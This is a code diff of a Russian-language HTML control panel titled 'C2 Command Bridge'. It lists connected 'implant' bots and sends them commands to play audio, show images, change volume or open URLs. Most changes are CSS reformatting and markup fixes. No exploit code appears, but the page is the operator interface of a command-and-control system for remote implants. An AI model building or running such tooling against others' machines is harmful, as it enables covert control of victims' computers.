@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия с обрезкой имён) -->
+<!-- Файл: index.html (Финальная, ревизированная версия) -->
 <html lang="ru">
 
 <head>
@@ -7,271 +7,335 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>C2 Коммандный Мостик (ФИНАЛ)</title>
     <style>
-            /* Все стили остаются без изменений */
-        
         :root {
-            :root {
-                --bg-color: #1a1a1c;
-                --primary-color: #2e2e33;
-                --secondary-color: #45454d;
-                --text-color: #e1e1e1;
-                --accent-color: #00aaff;
-                --action-color: #007bff;
-                --danger-color: #dc3545;
-                --error-color: #ff4d4d;
-                --success-color: #33cc33;
-            }
-            html,
-            body {
-                height: 100%;
-                margin: 0;
-                padding: 0;
-                overflow: hidden;
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-                background-color: var(--bg-color);
-                color: var(--text-color);
-            }
-            .container {
-                display: flex;
-                flex-direction: column;
-                height: 100%;
-            }
-            header {
-                flex-shrink: 0;
-                color: var(--accent-color);
-                text-align: center;
-                padding: 20px 0;
-                border-bottom: 1px solid var(--secondary-color);
-            }
-            h1,
-            h2,
-            h3 {
-                margin: 0;
-            }
-            h2 {
-                color: var(--accent-color);
-                padding-bottom: 10px;
-                margin-bottom: 20px;
-                border-bottom: 1px solid var(--secondary-color);
-            }
-            h3 {
-                margin-top: 20px;
-                margin-bottom: 10px;
-                text-align: center;
-                border-top: 1px solid var(--secondary-color);
-                padding-top: 20px;
-            }
+            --bg-color: #1a1a1c;
+            --primary-color: #2e2e33;
+            --secondary-color: #45454d;
+            --text-color: #e1e1e1;
+            --accent-color: #00aaff;
+            --action-color: #007bff;
+            --danger-color: #dc3545;
+            --error-color: #ff4d4d;
+            --success-color: #33cc33;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-size: 16px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        header {
+            flex-shrink: 0;
+            color: var(--accent-color);
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--secondary-color);
+        }
+        
+        h1,
+        h2,
+        h3 {
+            margin: 0;
+        }
+        
+        h1 {
+            font-size: 2em;
+        }
+        
+        h2 {
+            color: var(--accent-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--secondary-color);
+        }
+        
+        h3 {
+            margin-top: 20px;
+            margin-bottom: 10px;
+            text-align: center;
+            border-top: 1px solid var(--secondary-color);
+            padding-top: 20px;
+        }
+        
+        .app-layout {
+            display: flex;
+            flex-grow: 1;
+            overflow: hidden;
+            padding: 25px;
+            gap: 25px;
+        }
+        
+        .sidebar {
+            flex: 0 0 300px;
+            background-color: var(--primary-color);
+            border-radius: 12px;
+            border: 1px solid var(--secondary-color);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .sidebar h2 {
+            padding: 25px;
+            margin: 0;
+        }
+        
+        #bot-list {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 0 25px 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .main-content {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        section {
+            background-color: var(--primary-color);
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid var(--secondary-color);
+            margin-bottom: 25px;
+        }
+        
+        #resizer {
+            flex-shrink: 0;
+            background-color: var(--secondary-color);
+            height: 5px;
+            cursor: ns-resize;
+            transition: background-color 0.2s;
+        }
+        
+        #resizer:hover {
+            background-color: var(--accent-color);
+        }
+        
+        .log-container {
+            flex-shrink: 0;
+            background-color: #111;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Courier New', Courier, monospace;
+            height: 200px;
+        }
+        
+        .log-container.collapsed {
+            height: 42px !important;
+        }
+        
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background-color: var(--primary-color);
+            cursor: pointer;
+        }
+        
+        .log-header h3 {
+            margin: 0;
+            padding: 0;
+            border: none;
+            font-size: 1em;
+        }
+        
+        .log-header-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .log-header-buttons button {
+            padding: 2px10px;
+            font-size: 1.2em;
+            line-height: 1;
+            font-weight: bold;
+            background-color: var(--secondary-color);
+            border: none;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        
+        #log-list {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        
+        .log-entry {
+            margin: 2px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .log-info {
+            color: var(--text-color);
+        }
+        
+        .log-success {
+            color: var(--success-color);
+        }
+        
+        .log-error {
+            color: var(--error-color);
+        }
+        
+        .log-command {
+            color: var(--accent-color);
+        }
+        
+        .log-timestamp {
+            color: var(--secondary-color);
+            margin-right: 10px;
+        }
+        
+        button {
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            width: 100%;
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+        }
+        
+        .btn-bot {
+            background-color: #495057;
+        }
+        
+        .btn-bot.selected {
+            border: 3px solid var(--accent-color);
+            background-color: #0056b3;
+        }
+        
+        .btn-action {
+            background-color: var(--action-color);
+        }
+        
+        .btn-danger {
+            background-color: var(--danger-color);
+        }
+        
+        .grid-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border: 1px solid var(--secondary-color);
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            box-sizing: border-box;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+        }
+        
+        .thumbnail-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 15px;
+        }
+        
+        .thumbnail-item {
+            position: relative;
+            text-align: center;
+            background-color: var(--secondary-color);
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        .thumbnail-item img {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border: 2px solid var(--bg-color);
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        
+        .thumbnail-item p {
+            margin: 8px 0 0 0;
+            font-size: 0.8em;
+            word-wrap: break-word;
+        }
+        
+        .volume-control-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        #volume-value {
+            font-weight: bold;
+            min-width: 40px;
+            text-align: right;
+        }
+        
+        @media (max-width: 900px) {
             .app-layout {
-                display: flex;
-                flex-grow: 1;
-                overflow: hidden;
-                padding: 25px;
-                gap: 25px;
+                flex-direction: column;
+                padding: 10px;
+                gap: 10px;
             }
             .sidebar {
-                flex: 0 0 300px;
-                background-color: var(--primary-color);
-                border-radius: 12px;
-                border: 1px solid var(--secondary-color);
-                display: flex;
-                flex-direction: column;
-                overflow: hidden;
-            }
-            .sidebar h2 {
-                padding: 25px;
-                margin: 0;
-            }
-            #bot-list {
-                flex-grow: 1;
-                overflow-y: auto;
-                padding: 0 25px 25px;
-                display: flex;
-                flex-direction: column;
-                gap: 10px;
+                flex: 0 0 auto;
+                max-height: 30vh;
             }
             .main-content {
-                flex-grow: 1;
-                overflow-y: auto;
-                padding-right: 10px;
+                padding-right: 0;
             }
             section {
-                background-color: var(--primary-color);
-                padding: 25px;
-                border-radius: 12px;
-                border: 1px solid var(--secondary-color);
-                margin-bottom: 25px;
+                padding: 15px;
+            }
+            header h1 {
+                font-size: 1.5em;
             }
             #resizer {
-                flex-shrink: 0;
-                background-color: var(--secondary-color);
-                height: 5px;
-                cursor: ns-resize;
+                display: none;
             }
             .log-container {
-                flex-shrink: 0;
-                background-color: #111;
-                display: flex;
-                flex-direction: column;
-                font-family: 'Courier New', Courier, monospace;
-                height: 200px;
+                height: 150px !important;
             }
-            .log-container.collapsed {
-                height: 42px !important;
-            }
-            .log-header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                padding: 10px;
-                background-color: var(--primary-color);
-                cursor: pointer;
-            }
-            .log-header h3 {
-                margin: 0;
-                padding: 0;
-                border: none;
-                font-size: 1em;
-            }
-            .log-header-buttons {
-                display: flex;
-                gap: 10px;
-            }
-            .log-header-buttons button {
-                padding: 2px 10px;
-                font-size: 1.2em;
-                line-height: 1;
-                font-weight: bold;
-                background-color: var(--secondary-color);
-                border: none;
-                cursor: pointer;
-                border-radius: 4px;
-            }
-            #log-list {
-                flex-grow: 1;
-                overflow-y: auto;
-                padding: 10px;
-            }
-            .log-entry {
-                margin: 2px 0;
-                white-space: pre-wrap;
-                word-break: break-all;
-            }
-            .log-info {
-                color: var(--text-color);
-            }
-            .log-success {
-                color: var(--success-color);
-            }
-            .log-error {
-                color: var(--error-color);
-            }
-            .log-command {
-                color: var(--accent-color);
-            }
-            .log-timestamp {
-                color: var(--secondary-color);
-                margin-right: 10px;
-            }
-            button {
-                color: white;
-                padding: 12px 20px;
-                border: none;
-                border-radius: 8px;
-                cursor: pointer;
-                font-size: 1em;
-                font-weight: bold;
-                width: 100%;
-                transition: background-color 0.2s;
-                box-sizing: border-box;
-            }
-            .btn-bot {
-                background-color: #495057;
-            }
-            .btn-bot.selected {
-                border: 3px solid var(--accent-color);
-                background-color: #0056b3;
-            }
-            .btn-action {
-                background-color: var(--action-color);
-            }
-            .btn-danger {
-                background-color: var(--danger-color);
-            }
-            .grid-controls {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-                gap: 15px;
-            }
-            input[type="text"] {
-                width: 100%;
-                padding: 10px;
-                margin-bottom: 10px;
-                border-radius: 8px;
-                border: 1px solid var(--secondary-color);
-                background-color: var(--bg-color);
-                color: var(--text-color);
-                box-sizing: border-box;
-            }
-            input[type="range"] {
-                width: 100%;
-            }
-            .thumbnail-container {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-                gap: 15px;
-            }
-            .thumbnail-item {
-                position: relative;
-                text-align: center;
-                background-color: var(--secondary-color);
-                padding: 10px;
-                border-radius: 8px;
-            }
-            .thumbnail-item img {
-                width: 100px;
-                height: 100px;
-                object-fit: cover;
-                border: 2px solid var(--bg-color);
-                border-radius: 8px;
-                cursor: pointer;
-            }
-            .thumbnail-item p {
-                margin: 8px 0 0 0;
-                font-size: 0.8em;
-                word-wrap: break-word;
-            }
-            .volume-control-wrapper {
-                display: flex;
-                align-items: center;
-                gap: 15px;
-            }
-            #volume-value {
-                font-weight: bold;
-                min-width: 40px;
-                text-align: right;
-            }
-            @media (max-width: 900px) {
-                .app-layout {
-                    flex-direction: column;
-                    padding: 15px;
-                }
-                .sidebar {
-                    flex: 0 0 auto;
-                    max-height: 30vh;
-                }
-            }
+        }
     </style>
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик (ФИНАЛ)</h1></header>
+            <h1>Коммандный Мостик</h1></header>
         <main class="app-layout">
             <aside class="sidebar">
                 <h2>Боты в сети</h2>
                 <div id="bot-list">
-                    <pstyle="text-align:center;">Подключение...</p>
+                    <p style="text-align:center;">Подключение...</p>
                 </div>
             </aside>
             <div class="main-content">
@@ -323,7 +387,6 @@
             <div id="log-list"></div>
         </div>
     </div>
-
     <script>
         const ui = {
             botList: document.getElementById('bot-list'),
@@ -474,52 +537,42 @@
             ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
         }
 
-        // <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
         function renderBotFiles(files) {
             const audioContainer = ui.audioFilesList;
             audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
-            if (files.audio) {
-                files.audio.forEach(file => {
-                    const btn = document.createElement('button');
-                    btn.textContent = file;
-                    btn.className = 'btn-action';
-                    btn.onclick = () => sendCommand({
-                        action: 'play',
-                        filename: file
-                    });
-                    audioContainer.appendChild(btn);
+            if (files.audio) files.audio.forEach(file => {
+                const btn = document.createElement('button');
+                btn.textContent = file;
+                btn.className = 'btn-action';
+                btn.onclick = () => sendCommand({
+                    action: 'play',
+                    filename: file
                 });
-            }
-
+                audioContainer.appendChild(btn);
+            });
             const imageContainer = ui.imageFilesList;
             imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
-            if (files.image) {
-                files.image.forEach(imgData => {
-                    const item = document.createElement('div');
-                    item.className = 'thumbnail-item';
-
-                    const imgElement = document.createElement('img');
-                    imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : '';
-                    imgElement.alt = imgData.filename;
-                    imgElement.onclick = () => sendCommand({
-                        action: 'show',
-                        filename: imgData.filename
-                    });
-
-                    const nameElement = document.createElement('p');
-                    // Логика обрезки имени файла
-                    let displayName = imgData.filename;
-                    if (displayName.length > 40) {
-                        displayName = displayName.substring(0, 37) + '...';
-                    }
-                    nameElement.textContent = displayName;
-                    nameElement.title = imgData.filename; // Показываем полное имя при наведении
-
-                    item.appendChild(imgElement);
-                    item.appendChild(nameElement);
-                    imageContainer.appendChild(item);
+            if (files.image) files.image.forEach(imgData => {
+                const item = document.createElement('div');
+                item.className = 'thumbnail-item';
+                const imgElement = document.createElement('img');
+                imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : '';
+                imgElement.alt = imgData.filename;
+                imgElement.onclick = () => sendCommand({
+                    action: 'show',
+                    filename: imgData.filename
                 });
-            }
+                const nameElement = document.createElement('p');
+                let displayName = imgData.filename;
+                if (displayName.length > 40) {
+                    displayName = displayName.substring(0, 37) + '...';
+                }
+                nameElement.textContent = displayName;
+                nameElement.title = imgData.filename;
+                item.appendChild(imgElement);
+                item.appendChild(nameElement);
+                imageContainer.appendChild(item);
+            });
         }
 
         function sendCommand(payload) {
@@ -532,8 +585,7 @@
             }));
             log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
         }
-
-        const debounce = (func, delay) = & gt; {
+        const debounce = (func, delay) => {
             let timeout;
             return (...args) => {
                 clearTimeout(timeout);
@@ -557,7 +609,6 @@
                 url
             });
         }
-
         ui.logHeader.addEventListener('click', () => ui.logContainer.classList.toggle('collapsed'));
         ui.clearLogBtn.addEventListener('click', (e) => {
             e.stopPropagation();
